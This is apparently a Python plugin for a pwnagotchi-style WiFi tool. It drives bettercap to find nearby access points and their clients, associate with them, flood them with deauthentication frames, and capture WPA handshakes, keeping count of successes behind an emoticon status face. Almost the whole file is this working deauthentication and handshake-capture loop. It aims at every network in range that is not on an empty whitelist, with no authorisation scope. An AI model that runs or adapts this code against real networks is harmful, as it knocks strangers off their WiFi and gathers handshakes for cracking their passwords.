import os, sys
sys.path.insert(1, os.path.join(sys.path[0], '../..'))

import core.bettercap.bettercap as bcap
from core.utils import *
from random import choice
from time import sleep
import socket
from random import randint
from core.controlPanel.pManager import pluginManager

try:
    import netifaces as nf
    windows = False
except:
    windows = True

class vars:
    beaconExit = False
    framesSent = 0
    aps = 0
    clients = 0
    face = ""
    exited = False

    faces = { # 99% of these will be stolen in some way from pwnagotchi.ai
        "happy": "(◕‿‿◕)",
        "attacking": "(⌐■_■)",
        "lost": "(≖__≖)",
        "debug": "(#__#)",
        "assoc": "(°▃▃°)",
        "excited": "(☼‿‿☼)",
        "missed": "(ب__ب)",
        "searching": "(ಠ_↼ )"
    }

    console = ""
    handshakes = 0
    exitedSockRunning = False
    reporting = False # to prevent overlapping

exitThread = False

def pwnagotchiHTML(ipTuple, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTries:int=10, checkDelay:float=float(1), nextDelay:float=float(10)):
    global exitThread

    unixSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exitSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    a = pluginManager(unixSock, exitSock)

    # do ur plugin stuff here

    oldValues = {
        "aps": 0,
        "cli": 0
    }

    deauthed = {} 
    whitelist = []

    b = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    b.connect(("1.1.1.1", 80))
    ip = b.getpeername()[0]
    foundIface = False

    if len(nf.interfaces()) > 0:
        for x in nf.interfaces():
            if nf.ifaddresses(x)[nf.AF_INET][0]['addr'] == ip:
                a.send("cant use {}".format(x))
            else:
                foundIface = x
        if foundIface:
            a.send("setting {} in monitor mode".format(foundIface))

            
    else:
        a.send("can't start deauthing - if we were to start, the server would disconnect, rendering you unable to stop the plugin; plug in another wifi adapter to the pi and try again")

    if windows:
        #emulate
        while 1:
            a.send("very real thing: {}".format(randint(0,255)))
            vars.face = "({}-{})".format(randint(1,9),randint(1,9))
            sleep(randint(0,4))

            vars.reporting = True
            unixSock.sendall(str({
                "report": "true",
                "aps": str(vars.aps),
                "clients": str(vars.clients),
                "face": str(vars.face),
                "console": str(vars.console),
                "handshakes": str(vars.handshakes),
                "exited": str(vars.exitedSockRunning)
            }).replace("'", '"').encode('utf-8'))
            sleep(0.25)
            vars.reporting = False


    a.send("[+] whitelist: {}".format(', '.join(whitelist)))

    cli = bcap.Client()
    cli.recon()
    cli.clearWifi()

    while True:

        json = cli.getPairs()

        vars.aps = len(json)

        if vars.aps > oldValues["aps"]:
            vars.face = vars.faces["happy"]
        else:
            vars.face = vars.faces["lost"]

        vars.clients = 0

        for ap in json:
            vars.clients += len(json[ap][2]['clients'])

        for ap in json.copy():
            if a.exitThread: a.exitPlugin()
            fullBreak = False
            pulledHandshake = False
            ssid = json[ap][0]

            vars.face = vars.faces["searching"]

            if ap.lower() in whitelist:
                a.send("skipped {} due to whitelist".format(ap.lower()))
                continue

            if len(json[ap][2]['clients']) == 0:
                a.send("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
                continue # empty

            while True:
                if a.exitThread: a.exitPlugin()
    
                targetClient = choice(json[ap][2]["clients"]) # to deauth
                pickNew = False


                if targetClient[0].lower() in whitelist:
                    a.send("skipped {} due to whitelist (2)".format(ap.lower()))
                    fullBreak = True; break # pick new ap

                if ap in deauthed:
                    a.send("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
                    json.pop(ap)
                    fullBreak = True; break # pick new ap

                a.send("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
                        
                if pickNew: continue

                break

            if fullBreak: fullBreak = False; continue # if we need to pick new ap

            vars.console = "associating w {}".format(ap)
            a.send("associating with {} ({})".format(ap, ssid))
            vars.face = vars.faces["assoc"]
            cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc


            vars.face = vars.faces["attacking"]
            vars.console = "deauthing {}".format(ap)
            a.send("deauthing {} ({})".format(ap, ssid))

            for _x in range(deauthMaxTries):
                if a.exitThread: a.exitPlugin()
                if pulledHandshake: break
    

                for _z in range(deauthBurst):
                    if a.exitThread: a.exitPlugin()
                    a.send("sent deauth packets (us -> {}".format(ap))
                    cli.deauth(ap, throttle=0)

                    a.send("sent deauth packets (us -> {}".format(targetClient[0]))
                    cli.deauth(targetClient[0], throttle=0)

                sleep(5)

                for _y in range(checkHandshakeTries):
                    if a.exitThread: a.exitPlugin()
        
                    if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
                        a.send("got {}'s handshake ({})".format(ap, ssid))
                        vars.console = "got {}'s handshake".format(ssid)
                        vars.face = vars.faces["excited"]
                        vars.handshakes += 1

                        if ssid == "": # if ssid blank
                            fileField = ap.replace(":", "-") # some systems dont like ":"
                        else: # not blank
                            fileField = ssid


                        deauthed[ap] = [True, targetClient]

                        sleep(nextDelay)

                        pulledHandshake = True

                        break
                    else:
                        a.send("missed {}'s handshake ({})".format(ap, ssid))
                        vars.console = "missed {} handshake ({})".format(ssid, _y)
                        vars.face = vars.faces["lost"]

                    sleep(checkDelay)


            if not pulledHandshake:
                a.send("completely missed {}'s handshakes ({})".format(ap, ssid))
                vars.console = "completely missed"
                vars.face = vars.faces["missed"]
            
            pulledHandshake = False
            if a.exitThread: a.exitPlugin()

            sleep(nextDelay)


def functions():
    return {
        "pwnagotchiHTML": "deauthenticate using bettercap, just like the pwnagotchi"
    }